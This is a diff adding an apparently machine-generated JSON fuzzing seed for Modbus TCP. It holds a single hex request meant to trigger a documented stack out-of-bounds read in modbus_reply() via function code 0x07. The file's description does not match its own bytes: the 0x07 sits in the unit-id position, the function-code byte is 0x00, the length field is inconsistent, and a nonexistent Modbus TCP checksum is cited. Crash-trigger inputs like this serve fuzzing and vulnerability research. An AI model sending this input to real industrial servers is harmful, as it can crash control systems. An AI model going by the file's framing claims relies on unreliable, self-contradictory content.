@@ -1,0 +1,39 @@
+{
+  "coverage_summary": [
+    "Function code coverage: Read Exception Status (0x07) via single-request minimal-length ADU"
+  ],
+  "generation_notes": "Plan 065 uses function_code_coverage strategy on target_operation Read Exception Status to hit documented function-code entry point 0x07. Conservative 7-byte MBAP + 1-byte FC request exactly matches minimal-length trigger from issue evidence while preserving all framing/order/length rules. Only one sequence generated.",
+  "protocol_name": "MODBUSTCP",
+  "sequences": [
+    {
+      "constraints_preserved": [
+        "7-byte MBAP header mandatory",
+        "Protocol identifier 0x0000 preserved",
+        "MBAP length field set to 1 (exact PDU byte count)",
+        "Complete framing and checksum/order rules followed",
+        "No cosmetic byte-only variants; real documented function code 0x07 used"
+      ],
+      "evidence_ids": [
+        "function_code:function:function-text:c093c4ea4f67",
+        "issue:837:837-summary:c4fb6d28cc16"
+      ],
+      "expected_behavior": "Server accepts request as syntactically valid Modbus TCP ADU (MBAP length matches actual PDU size) but triggers stack out-of-bounds read in modbus_reply() on subsequent processing",
+      "issue_safety_notes": "Payload is strictly minimal valid request matching documented trigger; no data fields or extra bytes; conservative model completion for missing function specifics only; never exceeds actual ADU length or copies any historical PoC",
+      "messages": [
+        {
+          "direction": "client_to_server",
+          "hex": "0000000000010700",
+          "index": 0,
+          "label": "minimal_read_exception_status"
+        }
+      ],
+      "plan_id": "plan-065",
+      "purpose": "Trigger documented parser vulnerability at function-code entry point 0x07 by sending the exact minimal-length request that bypasses address fields yet still passes MBAP validation",
+      "seed_id": "seed-837-fc-01",
+      "strategy": "function_code_coverage",
+      "target_operation": "Read Exception Status",
+      "title": "Minimal MBAP + 0x07 Read Exception Status (no address fields)"
+    }
+  ],
+  "target_issue": 837
+}
